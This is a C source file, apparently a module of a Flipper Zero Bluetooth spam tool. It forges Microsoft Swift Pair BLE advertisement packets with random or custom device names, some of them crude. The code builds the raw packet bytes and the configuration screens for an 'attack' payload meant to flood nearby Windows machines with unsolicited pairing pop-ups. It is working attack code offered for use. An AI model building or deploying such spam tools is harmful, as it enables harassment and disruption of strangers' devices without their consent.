#include "swiftpair.h"
#include "_protocols.h"

// Hacked together by @Willy-JL and @Spooks4576
// Documentation at https://learn.microsoft.com/en-us/windows-hardware/design/component-guidelines/bluetooth-swift-pair

static const char* swiftpair_get_name(const ProtocolCfg* _cfg) {
    UNUSED(_cfg);
    return "SwiftPair";
}

static void swiftpair_make_packet(uint8_t* _size, uint8_t** _packet, const ProtocolCfg* _cfg) {
    const SwiftpairCfg* cfg = _cfg ? &_cfg->swiftpair : NULL;

    const char* name;
    if(cfg && cfg->name[0] != '\0') {
        name = cfg->name;
    } else {
        const char* names[] = {
            "Assquach💦",
            "Flipper 🐬",
            "iOS 17 🍎",
            "Kink💦",
            "👉👌",
            "🔵🦷",
        };
        name = names[rand() % COUNT_OF(names)];
    }
    uint8_t name_len = strlen(name);

    uint8_t size = 7 + name_len;
    uint8_t* packet = malloc(size);
    uint8_t i = 0;

    packet[i++] = size - 1; // Size
    packet[i++] = 0xFF; // AD Type (Manufacturer Specific)
    packet[i++] = 0x06; // Company ID (Microsoft)
    packet[i++] = 0x00; // ...
    packet[i++] = 0x03; // Microsoft Beacon ID
    packet[i++] = 0x00; // Microsoft Beacon Sub Scenario
    packet[i++] = 0x80; // Reserved RSSI Byte
    memcpy(&packet[i], name, name_len);
    i += name_len;

    *_size = size;
    *_packet = packet;
}

enum {
    _ConfigExtraStart = ConfigExtraStart,
    ConfigName,
    ConfigInfoRequire,
    ConfigCOUNT,
};
static void config_callback(void* _ctx, uint32_t index) {
    Ctx* ctx = _ctx;
    scene_manager_set_scene_state(ctx->scene_manager, SceneConfig, index);
    switch(index) {
    case ConfigName:
        scene_manager_next_scene(ctx->scene_manager, SceneSwiftpairName);
        break;
    case ConfigInfoRequire:
        break;
    default:
        ctx->fallback_config_enter(ctx, index);
        break;
    }
}
static void swiftpair_extra_config(Ctx* ctx) {
    SwiftpairCfg* cfg = &ctx->attack->payload.cfg.swiftpair;
    VariableItemList* list = ctx->variable_item_list;
    VariableItem* item;

    item = variable_item_list_add(list, "Display Name", 0, NULL, NULL);
    variable_item_set_current_value_text(item, cfg->name[0] != '\0' ? cfg->name : "Random");

    variable_item_list_add(list, "Requires enabling SwiftPair", 0, NULL, NULL);

    variable_item_list_set_enter_callback(list, config_callback, ctx);
}

static uint8_t swiftpair_config_count(const ProtocolCfg* _cfg) {
    UNUSED(_cfg);
    return ConfigCOUNT;
}

const Protocol protocol_swiftpair = {
    .icon = &I_windows,
    .get_name = swiftpair_get_name,
    .make_packet = swiftpair_make_packet,
    .extra_config = swiftpair_extra_config,
    .config_count = swiftpair_config_count,
};

static void name_callback(void* _ctx) {
    Ctx* ctx = _ctx;
    scene_manager_previous_scene(ctx->scene_manager);
}
void scene_swiftpair_name_on_enter(void* _ctx) {
    Ctx* ctx = _ctx;
    SwiftpairCfg* cfg = &ctx->attack->payload.cfg.swiftpair;
    TextInput* text_input = ctx->text_input;
    text_input_reset(text_input);

    text_input_set_header_text(text_input, "Leave empty for random");

    text_input_set_result_callback(
        text_input, name_callback, ctx, cfg->name, sizeof(cfg->name), true);

    text_input_set_minimum_length(text_input, 0);

    view_dispatcher_switch_to_view(ctx->view_dispatcher, ViewTextInput);
}
bool scene_swiftpair_name_on_event(void* _ctx, SceneManagerEvent event) {
    UNUSED(_ctx);
    UNUSED(event);
    return false;
}
void scene_swiftpair_name_on_exit(void* _ctx) {
    UNUSED(_ctx);
}
